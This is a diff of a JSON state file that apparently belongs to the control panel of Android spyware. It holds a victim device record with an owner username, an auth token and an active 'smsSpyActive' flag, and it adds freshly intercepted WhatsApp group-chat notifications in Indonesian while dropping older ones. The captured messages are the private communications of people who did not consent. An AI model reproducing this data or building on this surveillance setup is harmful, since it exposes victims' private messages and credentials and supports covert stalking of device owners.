@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003654664,
+    "lastSeen": 1776003655289,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎2 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003656932
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (2 pesan): ~ kiwaa inii",
+        "content": "KOK EMOJI NYA DIA BGT",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003656116
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "~ zaa?: WKWK",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003655280
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨: ~ zaa?",
@@ -4099,30 +4123,6 @@
         "time": "12/04 04:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1775942208810
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "12/04 04:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775941512821
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "12/04 04:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775941510487
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3 pesan dari 2 chat",
-        "time": "12/04 03:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775939134692
       }
     ],
     "galleryPhotos": [],
